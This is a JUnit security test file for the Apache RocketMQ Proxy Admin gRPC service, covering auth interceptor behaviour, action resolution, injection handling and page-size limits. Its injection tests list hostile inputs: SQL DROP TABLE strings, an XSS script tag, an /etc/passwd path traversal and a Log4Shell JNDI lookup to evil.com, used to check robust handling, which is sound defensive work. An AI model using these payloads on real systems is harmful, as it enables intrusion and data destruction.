/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

package org.apache.rocketmq.proxy.grpc.admin;

import io.grpc.Metadata;
import io.grpc.ServerCall;
import io.grpc.ServerCallHandler;
import io.grpc.Status;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import org.apache.rocketmq.auth.authentication.AuthenticationEvaluator;
import org.apache.rocketmq.auth.authentication.context.DefaultAuthenticationContext;
import org.apache.rocketmq.auth.authentication.exception.AuthenticationException;
import org.apache.rocketmq.auth.authorization.AuthorizationEvaluator;
import org.apache.rocketmq.auth.authorization.exception.AuthorizationException;
import org.apache.rocketmq.auth.config.AuthConfig;
import org.apache.rocketmq.common.action.Action;
import org.apache.rocketmq.proxy.grpc.admin.model.ClientInstanceInfo;
import org.apache.rocketmq.proxy.grpc.admin.model.ListClientsFilter;
import org.apache.rocketmq.proxy.service.admin.ProxyAdminClientService;
import org.apache.rocketmq.proxy.service.admin.ProxyAdminClientService.ListClientsResult;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.ArgumentCaptor;
import org.mockito.Mock;
import org.mockito.junit.MockitoJUnitRunner;
import apache.rocketmq.proxy.admin.v1.AdminCode;
import apache.rocketmq.proxy.admin.v1.DescribeClientRequest;
import apache.rocketmq.proxy.admin.v1.DescribeClientResponse;
import apache.rocketmq.proxy.admin.v1.ListClientsRequest;
import apache.rocketmq.proxy.admin.v1.ListClientsResponse;
import apache.rocketmq.proxy.admin.v1.ListClientsByGroupRequest;
import apache.rocketmq.proxy.admin.v1.ListClientsByGroupResponse;
import apache.rocketmq.proxy.admin.v1.ListClientsByTopicRequest;
import apache.rocketmq.proxy.admin.v1.ListClientsByTopicResponse;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doReturn;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * Security tests for Proxy Admin gRPC interface (RIP-2 §11.4).
 * <p>
 * Covers:
 * 1. Auth bypass — ACL disabled/enabled scenarios
 * 2. Unauthorized access — no credentials / invalid credentials
 * 3. Parameter injection — special characters in clientId, group, topic, prefix
 * 4. Oversized query — pageSize truncation enforcement (RIP-2 §8.2)
 */
@RunWith(MockitoJUnitRunner.class)
public class ProxyAdminSecurityTest {

    @Mock
    private ProxyAdminClientService adminClientService;

    private ProxyAdminGrpcService adminGrpcService;

    @Before
    public void setUp() {
        adminGrpcService = new ProxyAdminGrpcService(adminClientService, 2);
    }

    // ==================== 1. Auth Bypass Tests ====================

    /**
     * Test: When both authentication and authorization are disabled,
     * ProxyAdminAuthInterceptor should pass through all requests.
     * RIP-2 §7.3: Auth is only enforced when enabled.
     */
    @Test
    public void testAuthBypass_BothDisabled_PassThrough() throws Exception {
        AuthConfig authConfig = new AuthConfig();
        authConfig.setAuthenticationEnabled(false);
        authConfig.setAuthorizationEnabled(false);

        ProxyAdminAuthInterceptor interceptor = new ProxyAdminAuthInterceptor(
            authConfig, null);

        ServerCall call = mock(ServerCall.class);
        Metadata headers = new Metadata();
        ServerCallHandler next = mock(ServerCallHandler.class);

        // Should pass through without closing the call
        interceptor.interceptCall(call, headers, next);

        // Verify the call was NOT closed (i.e., request was allowed through)
        verify(call, never()).close(any(Status.class), any(Metadata.class));
        // Verify next handler was invoked
        verify(next).startCall(call, headers);
    }

    /**
     * Test: When authentication is enabled but no credentials are provided,
     * ProxyAdminAuthInterceptor should reject with UNAUTHENTICATED.
     * RIP-2 §7.3: Admin gRPC interface unified ACL 2.0 auth.
     */
    @Test
    public void testAuthBypass_AuthEnabled_NoCredentials_Rejected() throws Exception {
        AuthConfig authConfig = new AuthConfig();
        authConfig.setAuthenticationEnabled(true);
        authConfig.setAuthorizationEnabled(false);
        authConfig.setAuthenticationProvider("org.apache.rocketmq.auth.authentication.provider.DefaultAuthenticationProvider");
        authConfig.setAuthenticationMetadataProvider("org.apache.rocketmq.auth.authentication.provider.LocalAuthenticationMetadataProvider");

        // We need to create interceptor via reflection to avoid NPE from evaluator init
        // since we don't have a real MessagingProcessor
        ProxyAdminAuthInterceptor interceptor = createInterceptorWithAuthEnabled(authConfig);

        ServerCall call = mock(ServerCall.class);
        doReturn(ProxyAdminBindableService.LIST_CLIENTS_METHOD).when(call).getMethodDescriptor();
        Metadata headers = new Metadata();
        ServerCallHandler next = mock(ServerCallHandler.class);

        interceptor.interceptCall(call, headers, next);

        // Verify the call was closed with UNAUTHENTICATED status
        ArgumentCaptor<Status> statusCaptor = ArgumentCaptor.forClass(Status.class);
        verify(call).close(statusCaptor.capture(), any(Metadata.class));
        Status status = statusCaptor.getValue();
        assertTrue("Expected UNAUTHENTICATED or INTERNAL status, got: " + status.getCode(),
            status.getCode() == Status.Code.UNAUTHENTICATED
                || status.getCode() == Status.Code.INTERNAL);
    }

    /**
     * Test: When authorization is enabled but no credentials are provided,
     * ProxyAdminAuthInterceptor should reject the request.
     * RIP-2 §7.3: Authorization requires user identity.
     */
    @Test
    public void testAuthBypass_AuthzEnabled_NoCredentials_Rejected() throws Exception {
        AuthConfig authConfig = new AuthConfig();
        authConfig.setAuthenticationEnabled(false);
        authConfig.setAuthorizationEnabled(true);
        authConfig.setAuthorizationProvider("org.apache.rocketmq.auth.authorization.provider.DefaultAuthorizationProvider");
        authConfig.setAuthorizationMetadataProvider("org.apache.rocketmq.auth.authorization.provider.LocalAuthorizationMetadataProvider");

        ProxyAdminAuthInterceptor interceptor = createInterceptorWithAuthEnabled(authConfig);

        ServerCall call = mock(ServerCall.class);
        doReturn(ProxyAdminBindableService.DESCRIBE_CLIENT_METHOD).when(call).getMethodDescriptor();
        Metadata headers = new Metadata();
        ServerCallHandler next = mock(ServerCallHandler.class);

        interceptor.interceptCall(call, headers, next);

        // Verify the call was closed (rejected)
        verify(call).close(any(Status.class), any(Metadata.class));
        verify(next, never()).startCall(any(), any());
    }

    // ==================== 2. Unauthorized Access Tests ====================

    /**
     * Test: Resource constant verification.
     * RIP-2 §7.1: Admin resources follow proxy.admin.* pattern.
     */
    @Test
    public void testUnauthorized_ResourceConstants() {
        assertEquals("proxy.admin", ProxyAdminAuthInterceptor.ADMIN_RESOURCE_PREFIX);
        assertEquals("proxy.admin.client", ProxyAdminAuthInterceptor.CLIENT_ADMIN_RESOURCE);
    }

    /**
     * Test: Action resolution for all 4 admin RPCs.
     * RIP-2 §7.2: DescribeClient → GET, List* → LIST.
     */
    @Test
    public void testUnauthorized_ActionResolution() throws Exception {
        ProxyAdminAuthInterceptor interceptor = createInstanceWithoutConstructor();

        // DescribeClient should resolve to GET
        Action describeAction = invokeResolveAction(interceptor, "DescribeClient");
        assertEquals(Action.GET, describeAction);

        // List operations should resolve to LIST
        assertEquals(Action.LIST, invokeResolveAction(interceptor, "ListClients"));
        assertEquals(Action.LIST, invokeResolveAction(interceptor, "ListClientsByGroup"));
        assertEquals(Action.LIST, invokeResolveAction(interceptor, "ListClientsByTopic"));
    }

    /**
     * Test: Full gRPC method name resolution.
     * The interceptor should correctly extract method name from full path.
     */
    @Test
    public void testUnauthorized_FullMethodNameResolution() throws Exception {
        ProxyAdminAuthInterceptor interceptor = createInstanceWithoutConstructor();

        // Full gRPC method names
        assertEquals(Action.GET, invokeResolveAction(interceptor,
            "apache.rocketmq.proxy.v2.ProxyClientAdminService/DescribeClient"));
        assertEquals(Action.LIST, invokeResolveAction(interceptor,
            "apache.rocketmq.proxy.v2.ProxyClientAdminService/ListClients"));
    }

    /**
     * Test: Unknown method names default to LIST action (conservative approach).
     */
    @Test
    public void testUnauthorized_UnknownMethod_DefaultsToList() throws Exception {
        ProxyAdminAuthInterceptor interceptor = createInstanceWithoutConstructor();

        assertEquals(Action.LIST, invokeResolveAction(interceptor, "UnknownMethod"));
        assertEquals(Action.LIST, invokeResolveAction(interceptor, ""));
        assertEquals(Action.LIST, invokeResolveAction(interceptor, null));
    }

    // ==================== 3. Parameter Injection Tests ====================

    /**
     * Test: Special characters in clientId should not cause exceptions.
     * RIP-2 §11.4: Parameter injection security test.
     */
    @Test
    public void testInjection_SpecialCharsInClientId_NoException() throws Exception {
        String[] maliciousClientIds = {
            "'; DROP TABLE clients; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "client\u0000null",
            "client\n\r\t",
            "${jndi:ldap://evil.com/a}",
            "client'\"\\",
        };

        for (String maliciousId : maliciousClientIds) {
            CountDownLatch latch = new CountDownLatch(1);
            final String clientId = maliciousId;

            DescribeClientRequest request = DescribeClientRequest.newBuilder()
                .setClientId(clientId)
                .build();

            // Should handle gracefully - either return NOT_FOUND or INTERNAL_ERROR,
            // but never throw an unhandled exception
            adminGrpcService.describeClient(request,
                new io.grpc.stub.StreamObserver<DescribeClientResponse>() {
                    @Override
                    public void onNext(DescribeClientResponse value) {
                        // Should return an error code, not crash
                        assertTrue("Expected error code for malicious clientId: " + clientId,
                            value.getCode() != AdminCode.ADMIN_CODE_OK);
                        latch.countDown();
                    }

                    @Override
                    public void onError(Throwable t) {
                        fail("Should not throw unhandled exception for: " + clientId);
                    }

                    @Override
                    public void onCompleted() {}
                });

            assertTrue("describeClient should complete within 5s for: " + maliciousId,
                latch.await(5, TimeUnit.SECONDS));
        }
    }

    /**
     * Test: Special characters in group parameter should not cause exceptions.
     * RIP-2 §11.4: Parameter injection security test.
     */
    @Test
    public void testInjection_SpecialCharsInGroup_NoException() throws Exception {
        String[] maliciousGroups = {
            "'; DROP TABLE groups; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        };

        for (String maliciousGroup : maliciousGroups) {
            CountDownLatch latch = new CountDownLatch(1);
            final String group = maliciousGroup;

            ListClientsByGroupRequest request = ListClientsByGroupRequest.newBuilder()
                .setGroup(group)
                .setPageNum(1)
                .setPageSize(10)
                .build();

            adminGrpcService.listClientsByGroup(request,
                new io.grpc.stub.StreamObserver<ListClientsByGroupResponse>() {
                    @Override
                    public void onNext(ListClientsByGroupResponse value) {
                        // Should handle gracefully
                        latch.countDown();
                    }

                    @Override
                    public void onError(Throwable t) {
                        fail("Should not throw unhandled exception for group: " + group);
                    }

                    @Override
                    public void onCompleted() {}
                });

            assertTrue("listClientsByGroup should complete within 5s",
                latch.await(5, TimeUnit.SECONDS));
        }
    }

    /**
     * Test: Special characters in topic parameter should not cause exceptions.
     * RIP-2 §11.4: Parameter injection security test.
     */
    @Test
    public void testInjection_SpecialCharsInTopic_NoException() throws Exception {
        String[] maliciousTopics = {
            "'; DROP TABLE topics; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        };

        for (String maliciousTopic : maliciousTopics) {
            CountDownLatch latch = new CountDownLatch(1);
            final String topic = maliciousTopic;

            ListClientsByTopicRequest request = ListClientsByTopicRequest.newBuilder()
                .setTopic(topic)
                .setPageNum(1)
                .setPageSize(10)
                .build();

            adminGrpcService.listClientsByTopic(request,
                new io.grpc.stub.StreamObserver<ListClientsByTopicResponse>() {
                    @Override
                    public void onNext(ListClientsByTopicResponse value) {
                        latch.countDown();
                    }

                    @Override
                    public void onError(Throwable t) {
                        fail("Should not throw unhandled exception for topic: " + topic);
                    }

                    @Override
                    public void onCompleted() {}
                });

            assertTrue("listClientsByTopic should complete within 5s",
                latch.await(5, TimeUnit.SECONDS));
        }
    }

    /**
     * Test: Special characters in clientIdPrefix filter should not cause exceptions.
     * RIP-2 §11.4: Parameter injection security test.
     */
    @Test
    public void testInjection_SpecialCharsInClientIdPrefix_NoException() throws Exception {
        String[] maliciousPrefixes = {
            "'; DROP TABLE clients; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "%.*+?",
        };

        for (String maliciousPrefix : maliciousPrefixes) {
            CountDownLatch latch = new CountDownLatch(1);
            final String prefix = maliciousPrefix;

            ListClientsRequest request = ListClientsRequest.newBuilder()
                .setClientIdPrefix(prefix)
                .setPageNum(1)
                .setPageSize(10)
                .build();

            adminGrpcService.listClients(request,
                new io.grpc.stub.StreamObserver<ListClientsResponse>() {
                    @Override
                    public void onNext(ListClientsResponse value) {
                        latch.countDown();
                    }

                    @Override
                    public void onError(Throwable t) {
                        fail("Should not throw unhandled exception for prefix: " + prefix);
                    }

                    @Override
                    public void onCompleted() {}
                });

            assertTrue("listClients should complete within 5s",
                latch.await(5, TimeUnit.SECONDS));
        }
    }

    /**
     * Test: Empty and null-like strings in required fields return BAD_REQUEST.
     */
    @Test
    public void testInjection_EmptyRequiredFields_ReturnsBadRequest() throws Exception {
        // Empty clientId in DescribeClient
        {
            CountDownLatch latch = new CountDownLatch(1);
            DescribeClientRequest request = DescribeClientRequest.newBuilder()
                .setClientId("")
                .build();

            adminGrpcService.describeClient(request,
                new io.grpc.stub.StreamObserver<DescribeClientResponse>() {
                    @Override
                    public void onNext(DescribeClientResponse value) {
                        assertEquals(AdminCode.ADMIN_CODE_BAD_REQUEST, value.getCode());
                        latch.countDown();
                    }

                    @Override
                    public void onError(Throwable t) { fail("Should not throw"); }

                    @Override
                    public void onCompleted() {}
                });
            assertTrue(latch.await(5, TimeUnit.SECONDS));
        }

        // Empty group in ListClientsByGroup
        {
            CountDownLatch latch = new CountDownLatch(1);
            ListClientsByGroupRequest request = ListClientsByGroupRequest.newBuilder()
                .setGroup("")
                .setPageNum(1)
                .setPageSize(10)
                .build();

            adminGrpcService.listClientsByGroup(request,
                new io.grpc.stub.StreamObserver<ListClientsByGroupResponse>() {
                    @Override
                    public void onNext(ListClientsByGroupResponse value) {
                        assertEquals(AdminCode.ADMIN_CODE_BAD_REQUEST, value.getCode());
                        latch.countDown();
                    }

                    @Override
                    public void onError(Throwable t) { fail("Should not throw"); }

                    @Override
                    public void onCompleted() {}
                });
            assertTrue(latch.await(5, TimeUnit.SECONDS));
        }

        // Empty topic in ListClientsByTopic
        {
            CountDownLatch latch = new CountDownLatch(1);
            ListClientsByTopicRequest request = ListClientsByTopicRequest.newBuilder()
                .setTopic("")
                .setPageNum(1)
                .setPageSize(10)
                .build();

            adminGrpcService.listClientsByTopic(request,
                new io.grpc.stub.StreamObserver<ListClientsByTopicResponse>() {
                    @Override
                    public void onNext(ListClientsByTopicResponse value) {
                        assertEquals(AdminCode.ADMIN_CODE_BAD_REQUEST, value.getCode());
                        latch.countDown();
                    }

                    @Override
                    public void onError(Throwable t) { fail("Should not throw"); }

                    @Override
                    public void onCompleted() {}
                });
            assertTrue(latch.await(5, TimeUnit.SECONDS));
        }
    }

    // ==================== 4. Oversized Query Tests ====================

    /**
     * Test: pageSize exceeding MAX_PAGE_SIZE (100) must be truncated.
     * RIP-2 §8.2: pageSize upper bound is 100 to prevent large queries.
     */
    @Test
    public void testOversizedQuery_PageSizeExceedsMax_TruncatedTo100() throws Exception {
        int result = invokeEnforcePageSize(999999);
        assertEquals(100, result);
    }

    /**
     * Test: pageSize = 100 is allowed (at the boundary).
     * RIP-2 §8.2: Maximum page size is 100.
     */
    @Test
    public void testOversizedQuery_PageSizeAtBoundary() throws Exception {
        assertEquals(100, invokeEnforcePageSize(100));
    }

    /**
     * Test: pageSize = 101 is truncated to 100.
     */
    @Test
    public void testOversizedQuery_PageSizeJustOverBoundary() throws Exception {
        assertEquals(100, invokeEnforcePageSize(101));
    }

    /**
     * Test: pageSize = 0 defaults to 20.
     */
    @Test
    public void testOversizedQuery_PageSizeZero_DefaultsTo20() throws Exception {
        assertEquals(20, invokeEnforcePageSize(0));
    }

    /**
     * Test: Negative pageSize defaults to 20.
     */
    @Test
    public void testOversizedQuery_NegativePageSize_DefaultsTo20() throws Exception {
        assertEquals(20, invokeEnforcePageSize(-1));
        assertEquals(20, invokeEnforcePageSize(-100));
    }

    /**
     * Test: pageSize = 1 is allowed (minimum valid value).
     */
    @Test
    public void testOversizedQuery_PageSizeOne() throws Exception {
        assertEquals(1, invokeEnforcePageSize(1));
    }

    /**
     * Test: Integer.MAX_VALUE pageSize is truncated to 100.
     */
    @Test
    public void testOversizedQuery_IntegerMaxValue() throws Exception {
        assertEquals(100, invokeEnforcePageSize(Integer.MAX_VALUE));
    }

    /**
     * Test: Integer.MIN_VALUE pageSize defaults to 20.
     */
    @Test
    public void testOversizedQuery_IntegerMinValue() throws Exception {
        assertEquals(20, invokeEnforcePageSize(Integer.MIN_VALUE));
    }

    /**
     * Test: End-to-end pageSize enforcement in listClients.
     * Verify that a request with pageSize=999999 results in the service
     * being called with pageSize=100.
     */
    @Test
    public void testOversizedQuery_ListClients_EnforcedInServiceCall() throws Exception {
        List<ClientInstanceInfo> clients = new ArrayList<>();
        ListClientsResult mockResult = new ListClientsResult(0, 1, 100, clients);
        when(adminClientService.listClients(any(ListClientsFilter.class), eq(1), eq(100)))
            .thenReturn(mockResult);

        CountDownLatch latch = new CountDownLatch(1);
        ListClientsRequest request = ListClientsRequest.newBuilder()
            .setPageNum(1)
            .setPageSize(999999) // Should be truncated to 100
            .build();

        adminGrpcService.listClients(request,
            new io.grpc.stub.StreamObserver<ListClientsResponse>() {
                @Override
                public void onNext(ListClientsResponse value) {
                    assertEquals(AdminCode.ADMIN_CODE_OK, value.getCode());
                    latch.countDown();
                }

                @Override
                public void onError(Throwable t) { fail("Should not throw"); }

                @Override
                public void onCompleted() {}
            });

        assertTrue("listClients should complete within 5s", latch.await(5, TimeUnit.SECONDS));
        // Verify service was called with truncated pageSize=100, not 999999
        verify(adminClientService).listClients(any(ListClientsFilter.class), eq(1), eq(100));
    }

    // ==================== Helper Methods ====================

    /**
     * Use reflection to test the package-private enforcePageSize method.
     */
    private int invokeEnforcePageSize(int pageSize) throws Exception {
        Method method = ProxyAdminGrpcService.class.getDeclaredMethod("enforcePageSize", int.class);
        method.setAccessible(true);
        return (int) method.invoke(adminGrpcService, pageSize);
    }

    /**
     * Use reflection to test the private resolveAction method.
     */
    private Action invokeResolveAction(ProxyAdminAuthInterceptor interceptor, String methodName) throws Exception {
        Method method = ProxyAdminAuthInterceptor.class.getDeclaredMethod("resolveAction", String.class);
        method.setAccessible(true);
        return (Action) method.invoke(interceptor, methodName);
    }

    /**
     * Create a ProxyAdminAuthInterceptor instance without calling the constructor.
     * This avoids Mockito compatibility issues with Java 21 class files
     * and the complex AuthConfig/MessagingProcessor dependency chain.
     */
    @SuppressWarnings("unchecked")
    private static <T> T createInstanceWithoutConstructor() throws Exception {
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Object unsafe = unsafeField.get(null);
        Method allocateInstance = unsafeClass.getMethod("allocateInstance", Class.class);
        return (T) allocateInstance.invoke(unsafe, ProxyAdminAuthInterceptor.class);
    }

    /**
     * Create a ProxyAdminAuthInterceptor with auth enabled.
     * Uses reflection to set the authConfig field and mock evaluators
     * to avoid needing a real MessagingProcessor.
     */
    private ProxyAdminAuthInterceptor createInterceptorWithAuthEnabled(AuthConfig authConfig) throws Exception {
        // Create instance without constructor
        ProxyAdminAuthInterceptor interceptor = createInstanceWithoutConstructor();

        // Set authConfig field
        Field authConfigField = ProxyAdminAuthInterceptor.class.getDeclaredField("authConfig");
        authConfigField.setAccessible(true);
        authConfigField.set(interceptor, authConfig);

        // Set authenticationEvaluator to a mock that always throws AuthenticationException
        AuthenticationEvaluator authnEval = mock(AuthenticationEvaluator.class);
        doThrow(new AuthenticationException("Authentication required"))
            .when(authnEval).evaluate(any(DefaultAuthenticationContext.class));

        Field authnEvalField = ProxyAdminAuthInterceptor.class.getDeclaredField("authenticationEvaluator");
        authnEvalField.setAccessible(true);
        authnEvalField.set(interceptor, authnEval);

        // Set authorizationEvaluator to a mock that always throws AuthorizationException
        AuthorizationEvaluator authzEval = mock(AuthorizationEvaluator.class);
        doThrow(new AuthorizationException("Access denied"))
            .when(authzEval).evaluate(any());

        Field authzEvalField = ProxyAdminAuthInterceptor.class.getDeclaredField("authorizationEvaluator");
        authzEvalField.setAccessible(true);
        authzEvalField.set(interceptor, authzEval);

        return interceptor;
    }
}